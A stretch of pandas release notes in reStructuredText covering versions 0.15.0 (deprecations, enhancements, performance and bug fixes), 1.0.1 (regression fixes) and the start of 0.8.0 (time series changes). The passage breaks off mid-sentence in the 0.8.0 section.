_whatsnew_0150.refactoring:\n\nInternal refactoring\n^^^^^^^^^^^^^^^^^^^^\n\nIn 0.15.0 ``Index`` has internally been refactored to no longer sub-class ``ndarray``\nbut instead subclass ``PandasObject``, similarly to the rest of the pandas objects. This\nchange allows very easy sub-classing and creation of new index types. This should be\na transparent change with only very limited API implications (:issue:`5080`, :issue:`7439`, :issue:`7796`, :issue:`8024`, :issue:`8367`, :issue:`7997`, :issue:`8522`):\n\n- you may need to unpickle pandas version < 0.15.0 pickles using ``pd.read_pickle`` rather than ``pickle.load``. See :ref:`pickle docs <io.pickle>`\n- when plotting with a ``PeriodIndex``, the matplotlib internal axes will now be arrays of ``Period`` rather than a ``PeriodIndex`` (this is similar to how a ``DatetimeIndex`` passes arrays of ``datetimes`` now)\n- MultiIndexes will now raise similarly to other pandas objects w.r.t. truth testing, see :ref:`here <gotchas.truth>` (:issue:`7897`).\n- When plotting a DatetimeIndex directly with matplotlib's ``plot`` function,\n  the axis labels will no longer be formatted as dates but as integers (the\n  internal representation of a ``datetime64``). **UPDATE** This is fixed\n  in 0.15.1, see :ref:`here <whatsnew_0151.datetime64_plotting>`.\n\n.. _whatsnew_0150.deprecations:\n\nDeprecations\n^^^^^^^^^^^^\n\n- The attributes ``Categorical`` ``labels`` and ``levels`` attributes are\n  deprecated and renamed to ``codes`` and ``categories``.\n- The ``outtype`` argument to ``pd.DataFrame.to_dict`` has been deprecated in favor of ``orient``. (:issue:`7840`)\n- The ``convert_dummies`` method has been deprecated in favor of\n  ``get_dummies`` (:issue:`8140`)\n- The ``infer_dst`` argument in ``tz_localize`` will be deprecated in favor of\n  ``ambiguous`` to allow for more flexibility in dealing with DST transitions.\n  Replace ``infer_dst=True`` with ``ambiguous='infer'`` for the same behavior (:issue:`7943`).\n  See :ref:`the docs<timeseries.timezone_ambiguous>` for more details.\n- The top-level ``pd.value_range`` has been deprecated and can be replaced by ``.describe()`` (:issue:`8481`)\n\n.. _whatsnew_0150.index_set_ops:\n\n- The ``Index`` set operations ``+`` and ``-`` were deprecated in order to provide these for numeric type operations on certain index types. ``+`` can be replaced by ``.union()`` or ``|``, and ``-`` by ``.difference()``. Further the method name ``Index.diff()`` is deprecated and can be replaced by ``Index.difference()`` (:issue:`8226`)\n\n  .. code-block:: python\n\n      +\n     pd.Index(['a', 'b', 'c']) + pd.Index(['b', 'c', 'd'])\n\n      should be replaced by\n     pd.Index(['a', 'b', 'c']).union(pd.Index(['b', 'c', 'd']))\n\n  .. code-block:: python\n\n      -\n     pd.Index(['a', 'b', 'c']) - pd.Index(['b', 'c', 'd'])\n\n      should be replaced by\n     pd.Index(['a', 'b', 'c']).difference(pd.Index(['b', 'c', 'd']))\n\n- The ``infer_types`` argument to :func:`~pandas.read_html` now has no\n  effect and is deprecated (:issue:`7762`, :issue:`7032`).\n\n\n.. _whatsnew_0150.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Remove ``DataFrame.delevel`` method in favor of ``DataFrame.reset_index``\n\n\n\n.. _whatsnew_0150.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\nEnhancements in the importing/exporting of Stata files:\n\n- Added support for bool, uint8, uint16 and uint32 data types in ``to_stata`` (:issue:`7097`, :issue:`7365`)\n- Added conversion option when importing Stata files (:issue:`8527`)\n- ``DataFrame.to_stata`` and ``StataWriter`` check string length for\n  compatibility with limitations imposed in dta files where fixed-width\n  strings must contain 244 or fewer characters.  Attempting to write Stata\n  dta files with strings longer than 244 characters raises a ``ValueError``. (:issue:`7858`)\n- ``read_stata`` and ``StataReader`` can import missing data information into a\n  ``DataFrame`` by setting the argument ``convert_missing`` to ``True``. When\n  using this options, missing values are returned as ``StataMissingValue``\n  objects and columns containing missing values have ``object`` data type. (:issue:`8045`)\n\nEnhancements in the plotting functions:\n\n- Added ``layout`` keyword to ``DataFrame.plot``. You can pass a tuple of ``(rows, columns)``, one of which can be ``-1`` to automatically infer (:issue:`6667`, :issue:`8071`).\n- Allow to pass multiple axes to ``DataFrame.plot``, ``hist`` and ``boxplot`` (:issue:`5353`, :issue:`6970`, :issue:`7069`)\n- Added support for ``c``, ``colormap`` and ``colorbar`` arguments for ``DataFrame.plot`` with ``kind='scatter'`` (:issue:`7780`)\n- Histogram from ``DataFrame.plot`` with ``kind='hist'`` (:issue:`7809`), See :ref:`the docs<visualization.hist>`.\n- Boxplot from ``DataFrame.plot`` with ``kind='box'`` (:issue:`7998`), See :ref:`the docs<visualization.box>`.\n\nOther:\n\n- ``read_csv`` now has a keyword parameter ``float_precision`` which specifies which floating-point converter the C engine should use during parsing, see :ref:`here <io.float_precision>` (:issue:`8002`, :issue:`8044`)\n\n- Added ``searchsorted`` method to ``Series`` objects (:issue:`7447`)\n\n- :func:`describe` on mixed-types DataFrames is more flexible. Type-based column filtering is now possible via the ``include``/``exclude`` arguments.\n  See the :ref:`docs <basics.describe>` (:issue:`8164`).\n\n  .. ipython:: python\n\n    df = pd.DataFrame({'catA': ['foo', 'foo', 'bar'] * 8,\n                       'catB': ['a', 'b', 'c', 'd'] * 6,\n                       'numC': np.arange(24),\n                       'numD': np.arange(24.) + .5})\n    df.describe(include=[\"object\"])\n    df.describe(include=[\"number\", \"object\"], exclude=[\"float\"])\n\n  Requesting all columns is possible with the shorthand 'all'\n\n  .. ipython:: python\n\n    df.describe(include='all')\n\n  Without those arguments, ``describe`` will behave as before, including only numerical columns or, if none are, only categorical columns. See also the :ref:`docs <basics.describe>`\n\n- Added ``split`` as an option to the ``orient`` argument in ``pd.DataFrame.to_dict``. (:issue:`7840`)\n\n- The ``get_dummies`` method can now be used on DataFrames. By default only\n  categorical columns are encoded as 0's and 1's, while other columns are\n  left untouched.\n\n  .. ipython:: python\n\n    df = pd.DataFrame({'A': ['a', 'b', 'a'], 'B': ['c', 'c', 'b'],\n                    'C': [1, 2, 3]})\n    pd.get_dummies(df)\n\n- ``PeriodIndex`` supports ``resolution`` as the same as ``DatetimeIndex`` (:issue:`7708`)\n- ``pandas.tseries.holiday`` has added support for additional holidays and ways to observe holidays (:issue:`7070`)\n- ``pandas.tseries.holiday.Holiday`` now supports a list of offsets in Python3 (:issue:`7070`)\n- ``pandas.tseries.holiday.Holiday`` now supports a days_of_week parameter (:issue:`7070`)\n- ``GroupBy.nth()`` now supports selecting multiple nth values (:issue:`7910`)\n\n  .. ipython:: python\n\n    business_dates = pd.date_range(start='4/1/2014', end='6/30/2014', freq='B')\n    df = pd.DataFrame(1, index=business_dates, columns=['a', 'b'])\n     get the first, 4th, and last date index for each month\n    df.groupby([df.index.year, df.index.month]).nth([0, 3, -1])\n\n- ``Period`` and ``PeriodIndex`` supports addition/subtraction with ``timedelta``-likes (:issue:`7966`)\n\n  If ``Period`` freq is ``D``, ``H``, ``T``, ``S``, ``L``, ``U``, ``N``, ``Timedelta``-like can be added if the result can have same freq. Otherwise, only the same ``offsets`` can be added.\n\n  .. code-block:: ipython\n\n     In [104]: idx = pd.period_range('2014-07-01 09:00', periods=5, freq='H')\n\n     In [105]: idx\n     Out[105]:\n     PeriodIndex(['2014-07-01 09:00', '2014-07-01 10:00', '2014-07-01 11:00',\n                  '2014-07-01 12:00', '2014-07-01 13:00'],\n                 dtype='period[H]')\n\n     In [106]: idx + pd.offsets.Hour(2)\n     Out[106]:\n     PeriodIndex(['2014-07-01 11:00', '2014-07-01 12:00', '2014-07-01 13:00',\n                  '2014-07-01 14:00', '2014-07-01 15:00'],\n                 dtype='period[H]')\n\n     In [107]: idx + pd.Timedelta('120m')\n     Out[107]:\n     PeriodIndex(['2014-07-01 11:00', '2014-07-01 12:00', '2014-07-01 13:00',\n                  '2014-07-01 14:00', '2014-07-01 15:00'],\n                 dtype='period[H]')\n\n     In [108]: idx = pd.period_range('2014-07', periods=5, freq='M')\n\n     In [109]: idx\n     Out[109]: PeriodIndex(['2014-07', '2014-08', '2014-09', '2014-10', '2014-11'], dtype='period[M]')\n\n     In [110]: idx + pd.offsets.MonthEnd(3)\n     Out[110]: PeriodIndex(['2014-10', '2014-11', '2014-12', '2015-01', '2015-02'], dtype='period[M]')\n\n- Added experimental compatibility with ``openpyxl`` for versions >= 2.0. The ``DataFrame.to_excel``\n  method ``engine`` keyword now recognizes ``openpyxl1`` and ``openpyxl2``\n  which will explicitly require openpyxl v1 and v2 respectively, failing if\n  the requested version is not available. The ``openpyxl`` engine is a now a\n  meta-engine that automatically uses whichever version of openpyxl is\n  installed. (:issue:`7177`)\n\n- ``DataFrame.fillna`` can now accept a ``DataFrame`` as a fill value (:issue:`8377`)\n\n- Passing multiple levels to :meth:`~pandas.DataFrame.stack()` will now work when multiple level\n  numbers are passed (:issue:`7660`). See\n  :ref:`Reshaping by stacking and unstacking <reshaping.stack_multiple>`.\n\n- :func:`set_names`, :func:`set_labels`, and :func:`set_levels` methods now take an optional ``level`` keyword argument to all modification of specific level(s) of a MultiIndex. Additionally :func:`set_names` now accepts a scalar string value when operating on an ``Index`` or on a specific level of a ``MultiIndex`` (:issue:`7792`)\n\n  .. ipython:: python\n\n      idx = pd.MultiIndex.from_product([['a'], range(3), list(\"pqr\")],\n                                       names=['foo', 'bar', 'baz'])\n      idx.set_names('qux', level=0)\n      idx.set_names(['qux', 'corge'], level=[0, 1])\n      idx.set_levels(['a', 'b', 'c'], level='bar')\n      idx.set_levels([['a', 'b', 'c'], [1, 2, 3]], level=[1, 2])\n\n- ``Index.isin`` now supports a ``level`` argument to specify which index level\n  to use for membership tests (:issue:`7892`, :issue:`7890`)\n\n  .. code-block:: ipython\n\n     In [1]: idx = pd.MultiIndex.from_product([[0, 1], ['a', 'b', 'c']])\n\n     In [2]: idx.values\n     Out[2]: array([(0, 'a'), (0, 'b'), (0, 'c'), (1, 'a'), (1, 'b'), (1, 'c')], dtype=object)\n\n     In [3]: idx.isin(['a', 'c', 'e'], level=1)\n     Out[3]: array([ True, False,  True,  True, False,  True], dtype=bool)\n\n- ``Index`` now supports ``duplicated`` and ``drop_duplicates``. (:issue:`4060`)\n\n  .. ipython:: python\n\n     idx = pd.Index([1, 2, 3, 4, 1, 2])\n     idx\n     idx.duplicated()\n     idx.drop_duplicates()\n\n- add ``copy=True`` argument to ``pd.concat`` to enable pass through of complete blocks (:issue:`8252`)\n\n- Added support for numpy 1.8+ data types (``bool_``, ``int_``, ``float_``, ``string_``) for conversion to R dataframe  (:issue:`8400`)\n\n\n\n.. _whatsnew_0150.performance:\n\nPerformance\n~~~~~~~~~~~\n\n- Performance improvements in ``DatetimeIndex.__iter__`` to allow faster iteration (:issue:`7683`)\n- Performance improvements in ``Period`` creation (and ``PeriodIndex`` setitem) (:issue:`5155`)\n- Improvements in Series.transform for significant performance gains (revised) (:issue:`6496`)\n- Performance improvements in ``StataReader`` when reading large files (:issue:`8040`, :issue:`8073`)\n- Performance improvements in ``StataWriter`` when writing large files (:issue:`8079`)\n- Performance and memory usage improvements in multi-key ``groupby`` (:issue:`8128`)\n- Performance improvements in groupby ``.agg`` and ``.apply`` where builtins max/min were not mapped to numpy/cythonized versions (:issue:`7722`)\n- Performance improvement in writing to sql (``to_sql``) of up to 50% (:issue:`8208`).\n- Performance benchmarking of groupby for large value of ngroups (:issue:`6787`)\n- Performance improvement in ``CustomBusinessDay``, ``CustomBusinessMonth`` (:issue:`8236`)\n- Performance improvement for ``MultiIndex.values`` for multi-level indexes containing datetimes (:issue:`8543`)\n\n\n\n.. _whatsnew_0150.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in pivot_table, when using margins and a dict aggfunc (:issue:`8349`)\n- Bug in ``read_csv`` where ``squeeze=True`` would return a view (:issue:`8217`)\n- Bug in checking of table name in ``read_sql`` in certain cases (:issue:`7826`).\n- Bug in ``DataFrame.groupby`` where ``Grouper`` does not recognize level when frequency is specified (:issue:`7885`)\n- Bug in multiindexes dtypes getting mixed up when DataFrame is saved to SQL table (:issue:`8021`)\n- Bug in ``Series`` 0-division with a float and integer operand dtypes  (:issue:`7785`)\n- Bug in ``Series.astype(\"unicode\")`` not calling ``unicode`` on the values correctly (:issue:`7758`)\n- Bug in ``DataFrame.as_matrix()`` with mixed ``datetime64[ns]`` and ``timedelta64[ns]`` dtypes (:issue:`7778`)\n- Bug in ``HDFStore.select_column()`` not preserving UTC timezone info when selecting a ``DatetimeIndex`` (:issue:`7777`)\n- Bug in ``to_datetime`` when ``format='%Y%m%d'`` and ``coerce=True`` are specified, where previously an object array was returned (rather than\n  a coerced time-series with ``NaT``), (:issue:`7930`)\n- Bug in ``DatetimeIndex`` and ``PeriodIndex`` in-place addition and subtraction cause different result from normal one (:issue:`6527`)\n- Bug in adding and subtracting ``PeriodIndex`` with ``PeriodIndex`` raise ``TypeError`` (:issue:`7741`)\n- Bug in ``combine_first`` with ``PeriodIndex`` data raises ``TypeError`` (:issue:`3367`)\n- Bug in MultiIndex slicing with missing indexers (:issue:`7866`)\n- Bug in MultiIndex slicing with various edge cases (:issue:`8132`)\n- Regression in MultiIndex indexing with a non-scalar type object (:issue:`7914`)\n- Bug in ``Timestamp`` comparisons with ``==`` and ``int64`` dtype (:issue:`8058`)\n- Bug in pickles contains ``DateOffset`` may raise ``AttributeError`` when ``normalize`` attribute is referred internally (:issue:`7748`)\n- Bug in ``Panel`` when using ``major_xs`` and ``copy=False`` is passed (deprecation warning fails because of missing ``warnings``) (:issue:`8152`).\n- Bug in pickle deserialization that failed for pre-0.14.1 containers with dup items trying to avoid ambiguity\n  when matching block and manager items, when there's only one block there's no ambiguity (:issue:`7794`)\n- Bug in putting a ``PeriodIndex`` into a ``Series`` would convert to ``int64`` dtype, rather than ``object`` of ``Periods`` (:issue:`7932`)\n- Bug in ``HDFStore`` iteration when passing a where (:issue:`8014`)\n- Bug in ``DataFrameGroupby.transform`` when transforming with a passed non-sorted key (:issue:`8046`, :issue:`8430`)\n- Bug in repeated timeseries line and area plot may result in ``ValueError`` or incorrect kind (:issue:`7733`)\n- Bug in inference in a ``MultiIndex`` with ``datetime.date`` inputs (:issue:`7888`)\n- Bug in ``get`` where an ``IndexError`` would not cause the default value to be returned (:issue:`7725`)\n- Bug in ``offsets.apply``, ``rollforward`` and ``rollback`` may reset nanosecond (:issue:`7697`)\n- Bug in ``offsets.apply``, ``rollforward`` and ``rollback`` may raise ``AttributeError`` if ``Timestamp`` has ``dateutil`` tzinfo (:issue:`7697`)\n- Bug in sorting a MultiIndex frame with a ``Float64Index`` (:issue:`8017`)\n- Bug in inconsistent panel setitem with a rhs of a ``DataFrame`` for alignment (:issue:`7763`)\n- Bug in ``is_superperiod`` and ``is_subperiod`` cannot handle higher frequencies than ``S`` (:issue:`7760`, :issue:`7772`, :issue:`7803`)\n- Bug in 32-bit platforms with ``Series.shift`` (:issue:`8129`)\n- Bug in ``PeriodIndex.unique`` returns int64 ``np.ndarray`` (:issue:`7540`)\n- Bug in ``groupby.apply`` with a non-affecting mutation in the function (:issue:`8467`)\n- Bug in ``DataFrame.reset_index`` which has ``MultiIndex`` contains ``PeriodIndex`` or ``DatetimeIndex`` with tz raises ``ValueError`` (:issue:`7746`, :issue:`7793`)\n- Bug in ``DataFrame.plot`` with ``subplots=True`` may draw unnecessary minor xticks and yticks (:issue:`7801`)\n- Bug in ``StataReader`` which did not read variable labels in 117 files due to difference between Stata documentation and implementation (:issue:`7816`)\n- Bug in ``StataReader`` where strings were always converted to 244 characters-fixed width irrespective of underlying string size (:issue:`7858`)\n- Bug in ``DataFrame.plot`` and ``Series.plot`` may ignore ``rot`` and ``fontsize`` keywords (:issue:`7844`)\n- Bug in ``DatetimeIndex.value_counts`` doesn't preserve tz  (:issue:`7735`)\n- Bug in ``PeriodIndex.value_counts`` results in ``Int64Index`` (:issue:`7735`)\n- Bug in ``DataFrame.join`` when doing left join on index and there are multiple matches (:issue:`5391`)\n- Bug in ``GroupBy.transform()`` where int groups with a transform that\n  didn't preserve the index were incorrectly truncated (:issue:`7972`).\n- Bug in ``groupby`` where callable objects without name attributes would take the wrong path,\n  and produce a ``DataFrame`` instead of a ``Series`` (:issue:`7929`)\n- Bug in ``groupby`` error message when a DataFrame grouping column is duplicated (:issue:`7511`)\n- Bug in ``read_html`` where the ``infer_types`` argument forced coercion of\n  date-likes incorrectly (:issue:`7762`, :issue:`7032`).\n- Bug in ``Series.str.cat`` with an index which was filtered as to not include the first item (:issue:`7857`)\n- Bug in ``Timestamp`` cannot parse ``nanosecond`` from string (:issue:`7878`)\n- Bug in ``Timestamp`` with string offset and ``tz`` results incorrect (:issue:`7833`)\n- Bug in ``tslib.tz_convert`` and ``tslib.tz_convert_single`` may return different results (:issue:`7798`)\n- Bug in ``DatetimeIndex.intersection`` of non-overlapping timestamps with tz raises ``IndexError`` (:issue:`7880`)\n- Bug in alignment with TimeOps and non-unique indexes (:issue:`8363`)\n- Bug in ``GroupBy.filter()`` where fast path vs. slow path made the filter\n  return a non scalar value that appeared valid but wasn't (:issue:`7870`).\n- Bug in ``date_range()``/``DatetimeIndex()`` when the timezone was inferred from input dates yet incorrect\n  times were returned when crossing DST boundaries (:issue:`7835`, :issue:`7901`).\n- Bug in ``to_excel()`` where a negative sign was being prepended to positive infinity and was absent for negative infinity (:issue:`7949`)\n- Bug in area plot draws legend with incorrect ``alpha`` when ``stacked=True`` (:issue:`8027`)\n- ``Period`` and ``PeriodIndex`` addition/subtraction with ``np.timedelta64`` results in incorrect internal representations (:issue:`7740`)\n- Bug in ``Holiday`` with no offset or observance (:issue:`7987`)\n- Bug in ``DataFrame.to_latex`` formatting when columns or index is a ``MultiIndex`` (:issue:`7982`).\n- Bug in ``DateOffset`` around Daylight Savings Time produces unexpected results (:issue:`5175`).\n- Bug in ``DataFrame.shift`` where empty columns would throw ``ZeroDivisionError`` on numpy 1.7 (:issue:`8019`)\n- Bug in installation where ``html_encoding/*.html`` wasn't installed and\n  therefore some tests were not running correctly (:issue:`7927`).\n- Bug in ``read_html`` where ``bytes`` objects were not tested for in\n  ``_read`` (:issue:`7927`).\n- Bug in ``DataFrame.stack()`` when one of the column levels was a datelike (:issue:`8039`)\n- Bug in broadcasting numpy scalars with ``DataFrame`` (:issue:`8116`)\n- Bug in ``pivot_table`` performed with nameless ``index`` and ``columns`` raises ``KeyError`` (:issue:`8103`)\n- Bug in ``DataFrame.plot(kind='scatter')`` draws points and errorbars with different colors when the color is specified by ``c`` keyword (:issue:`8081`)\n- Bug in ``Float64Index`` where ``iat`` and ``at`` were not testing and were\n  failing (:issue:`8092`).\n- Bug in ``DataFrame.boxplot()`` where y-limits were not set correctly when\n  producing multiple axes (:issue:`7528`, :issue:`5517`).\n- Bug in ``read_csv`` where line comments were not handled correctly given\n  a custom line terminator or ``delim_whitespace=True`` (:issue:`8122`).\n- Bug in ``read_html`` where empty tables caused a ``StopIteration`` (:issue:`7575`)\n- Bug in casting when setting a column in a same-dtype block (:issue:`7704`)\n- Bug in accessing groups from a ``GroupBy`` when the original grouper\n  was a tuple (:issue:`8121`).\n- Bug in ``.at`` that would accept integer indexers on a non-integer index and do fallback (:issue:`7814`)\n- Bug with kde plot and NaNs (:issue:`8182`)\n- Bug in ``GroupBy.count`` with float32 data type were nan values were not excluded (:issue:`8169`).\n- Bug with stacked barplots and NaNs (:issue:`8175`).\n- Bug in resample with non evenly divisible offsets (e.g. '7s') (:issue:`8371`)\n- Bug in interpolation methods with the ``limit`` keyword when no values needed interpolating (:issue:`7173`).\n- Bug where ``col_space`` was ignored in ``DataFrame.to_string()`` when ``header=False`` (:issue:`8230`).\n- Bug with ``DatetimeIndex.asof`` incorrectly matching partial strings and returning the wrong date (:issue:`8245`).\n- Bug in plotting methods modifying the global matplotlib rcParams (:issue:`8242`).\n- Bug in ``DataFrame.__setitem__`` that caused errors when setting a dataframe column to a sparse array (:issue:`8131`)\n- Bug where ``Dataframe.boxplot()`` failed when entire column was empty (:issue:`8181`).\n- Bug with messed variables in ``radviz`` visualization (:issue:`8199`).\n- Bug in interpolation methods with the ``limit`` keyword when no values needed interpolating (:issue:`7173`).\n- Bug where ``col_space`` was ignored in ``DataFrame.to_string()`` when ``header=False`` (:issue:`8230`).\n- Bug in ``to_clipboard`` that would clip long column data (:issue:`8305`)\n- Bug in ``DataFrame`` terminal display: Setting max_column/max_rows to zero did not trigger auto-resizing of dfs to fit terminal width/height (:issue:`7180`).\n- Bug in OLS where running with \"cluster\" and \"nw_lags\" parameters did not work correctly, but also did not throw an error\n  (:issue:`5884`).\n- Bug in ``DataFrame.dropna`` that interpreted non-existent columns in the subset argument as the 'last column' (:issue:`8303`)\n- Bug in ``Index.intersection`` on non-monotonic non-unique indexes (:issue:`8362`).\n- Bug in masked series assignment where mismatching types would break alignment (:issue:`8387`)\n- Bug in ``NDFrame.equals`` gives false negatives with dtype=object (:issue:`8437`)\n- Bug in assignment with indexer where type diversity would break alignment (:issue:`8258`)\n- Bug in ``NDFrame.loc`` indexing when row/column names were lost when target was a list/ndarray (:issue:`6552`)\n- Regression in ``NDFrame.loc`` indexing when rows/columns were converted to Float64Index if target was an empty list/ndarray (:issue:`7774`)\n- Bug in ``Series`` that allows it to be indexed by a ``DataFrame`` which has unexpected results.  Such indexing is no longer permitted (:issue:`8444`)\n- Bug in item assignment of a ``DataFrame`` with MultiIndex columns where right-hand-side columns were not aligned (:issue:`7655`)\n- Suppress FutureWarning generated by NumPy when comparing object arrays containing NaN for equality (:issue:`7065`)\n- Bug in ``DataFrame.eval()`` where the dtype of the ``not`` operator (``~``)\n  was not correctly inferred as ``bool``.\n\n\n.. _whatsnew_0.15.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.14.1..v0.15.0\n\n\n.. _whatsnew_101:\n\nWhat's new in 1.0.1 (February 5, 2020)\n--------------------------------------\n\nThese are the changes in pandas 1.0.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_101.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :class:`DataFrame` setting values with a slice (e.g. ``df[-4:] = 1``) indexing by label instead of position (:issue:`31469`)\n- Fixed regression when indexing a ``Series`` or ``DataFrame`` indexed by ``DatetimeIndex`` with a slice containing a :class:`datetime.date` (:issue:`31501`)\n- Fixed regression in ``DataFrame.__setitem__`` raising an ``AttributeError`` with a :class:`MultiIndex` and a non-monotonic indexer (:issue:`31449`)\n- Fixed regression in :class:`Series` multiplication when multiplying a numeric :class:`Series` with >10000 elements with a timedelta-like scalar (:issue:`31457`)\n- Fixed regression in ``.groupby().agg()`` raising an ``AssertionError`` for some reductions like ``min`` on object-dtype columns (:issue:`31522`)\n- Fixed regression in ``.groupby()`` aggregations with categorical dtype using Cythonized reduction functions (e.g. ``first``) (:issue:`31450`)\n- Fixed regression in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` if called with a function which returned a non-pandas non-scalar object (e.g. a list or numpy array) (:issue:`31441`)\n- Fixed regression in :meth:`DataFrame.groupby` whereby taking the minimum or maximum of a column with period dtype would raise a ``TypeError``. (:issue:`31471`)\n- Fixed regression in :meth:`DataFrame.groupby` with an empty DataFrame grouping by a level of a MultiIndex (:issue:`31670`).\n- Fixed regression in :meth:`DataFrame.apply` with object dtype and non-reducing function (:issue:`31505`)\n- Fixed regression in :meth:`to_datetime` when parsing non-nanosecond resolution datetimes (:issue:`31491`)\n- Fixed regression in :meth:`~DataFrame.to_csv` where specifying an ``na_rep`` might truncate the values written (:issue:`31447`)\n- Fixed regression in :class:`Categorical` construction with ``numpy.str_`` categories (:issue:`31499`)\n- Fixed regression in :meth:`DataFrame.loc` and :meth:`DataFrame.iloc` when selecting a row containing a single ``datetime64`` or ``timedelta64`` column (:issue:`31649`)\n- Fixed regression where setting :attr:`pd.options.display.max_colwidth` was not accepting negative integer. In addition, this behavior has been deprecated in favor of using ``None`` (:issue:`31532`)\n- Fixed regression in objTOJSON.c fix return-type warning (:issue:`31463`)\n- Fixed regression in :meth:`qcut` when passed a nullable integer. (:issue:`31389`)\n- Fixed regression in assigning to a :class:`Series` using a nullable integer dtype (:issue:`31446`)\n- Fixed performance regression when indexing a ``DataFrame`` or ``Series`` with a :class:`MultiIndex` for the index using a list of labels (:issue:`31648`)\n- Fixed regression in :meth:`read_csv` used in file like object ``RawIOBase`` is not recognize ``encoding`` option (:issue:`31575`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_101.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- Support for negative integer for :attr:`pd.options.display.max_colwidth` is deprecated in favor of using ``None`` (:issue:`31532`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_101.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**Datetimelike**\n\n- Fixed bug in :meth:`to_datetime` raising when ``cache=True`` and out-of-bound values are present (:issue:`31491`)\n\n**Numeric**\n\n- Bug in dtypes being lost in ``DataFrame.__invert__`` (``~`` operator) with mixed dtypes (:issue:`31183`)\n  and for extension-array backed ``Series`` and ``DataFrame`` (:issue:`23087`)\n\n**Plotting**\n\n- Plotting tz-aware timeseries no longer gives UserWarning (:issue:`31205`)\n\n**Interval**\n\n- Bug in :meth:`Series.shift` with ``interval`` dtype raising a ``TypeError`` when shifting an interval array of integers or datetimes (:issue:`34195`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_101.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.0..v1.0.1|HEAD\n\n\n.. _whatsnew_080:\n\nVersion 0.8.0 (June 29, 2012)\n-----------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.7.3 and includes extensive work on the time\nseries handling and processing infrastructure as well as a great deal of new\nfunctionality throughout the library. It includes over 700 commits from more\nthan 20 distinct authors. Most pandas 0.7.3 and earlier users should not\nexperience any issues upgrading, but due to the migration to the NumPy\ndatetime64 dtype, there may be a number of bugs and incompatibilities\nlurking. Lingering incompatibilities will be fixed ASAP in a 0.8.1 release if\nnecessary. See the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\nSupport for non-unique indexes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAll objects can now work with non-unique indexes. Data alignment / join\noperations work according to SQL join semantics (including, if application,\nindex duplication in many-to-many joins)\n\nNumPy datetime64 dtype and 1.6 dependency\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTime series data are now represented using NumPy's datetime64 dtype; thus,\npandas 0.8.0 now requires at least NumPy 1.6. It has been tested and verified\nto work with the development version (1.7+) of NumPy as well which includes\nsome significant user-facing API changes. NumPy 1.6 also has a number of bugs\nhaving to do with nanosecond resolution data, so I recommend that you steer\nclear of NumPy 1.6's datetime64 API functions (though limited as they are) and\nonly interact with this data using the interface that pandas provides.\n\nSee the end of the 0.8.0 section for a \"porting\" guide listing potential issues\nfor users migrating legacy code bases from pandas 0.7 or earlier to 0.8.0.\n\nBug fixes to the 0.7.x series for legacy NumPy < 1.6 users will be provided as\nthey arise. There will be no more further development in 0.7.x beyond bug\nfixes.\n\nTime Series changes and improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. note::\n\n    With this release, legacy scikits.timeseries users should be able to port\n    their code to use pandas.\n\n.. note::\n\n    See :ref:`documentation <timeseries>` for overview of pandas timeseries API.\n\n- New datetime64 representation **speeds up join operations and data\n  alignment**, **reduces memory usage**, and improve serialization /\n  deserialization performance significantly over datetime.datetime\n- High performance and flexible **resample** method for converting from\n  high-to-low and low-to-high frequency. Supports interpolation, user-defined\n  aggregation functions, and control over how the intervals and result labeling\n  are defined. A suite of high performance Cython/C-based resampling functions\n  (including Open-High-Low-Close) have also been implemented.\n- Revamp of :ref:`frequency aliases <timeseries.offset_aliases>` and support for\n  **frequency shortcuts** like '15min', or '1h30min'\n- New :ref:`DatetimeIndex class <timeseries.datetimeindex>` supports both fixed\n  frequency and irregular time\n  series. Replaces now deprecated DateRange class\n- New ``PeriodIndex`` and ``Period`` classes for representing\n  :ref:`time spans <timeseries.periods>` and performing **calendar logic**,\n  including the ``12 fiscal quarterly frequencies <timeseries.quarterly>``.\n  This is a partial port of, and a substantial enhancement to,\n  elements of the scikits.timeseries code base. Support for conversion between\n  PeriodIndex and DatetimeIndex\n- New Timestamp data type subclasses ``datetime.datetime``, providing the same\n  interface while enabling working with nanosecond-resolution data. Also\n  provides :ref:`easy time zone conversions <timeseries.timezone>`.\n- Enhanced support for :ref:`time zones <timeseries.timezone>`. Add\n  ``tz_convert`` and ``tz_localize`` methods to TimeSeries and DataFrame. All\n  timestamps are stored as UTC; Timestamps from DatetimeIndex objects with time\n  zone set will be localized to local time. Time zone conversions are therefore\n  essentially free. User needs to know very little about pytz library now; only\n  time zone names as strings are required. Time zone-aware timestamps are\n  equal if and only if their UTC timestamps match. Operations between time\n  zone-aware time series with different time zones will result in a UTC-indexed\n  time series.\n- Time series **string indexing conveniences** / shortcuts: slice years, year\n  and month, and index values with strings\n- Enhanced time series **plotting**; adaptation of scikits.timeseries\n  matplotlib-based plotting code\n- New ``date_range``, ``bdate_range``, and ``period_range`` :ref:`factory\n  functions <timeseries.daterange>`\n- Robust **frequency inference** function ``infer_freq`` and ``inferred_freq``\n  property of DatetimeIndex, with option to infer frequency on construction of\n  DatetimeIndex\n- to_datetime function efficiently **parses array of strings** to\n  DatetimeIndex. DatetimeIndex will parse array or list of strings to\n  datetime64\n- **Optimized** support for datetime64-dtype data in Series and DataFrame\n  columns\n- New NaT (Not-a-Time) type to represent **NA** in timestamp arrays\n- Optimize Series.asof for looking up **\"as of\" values** for arrays of\n  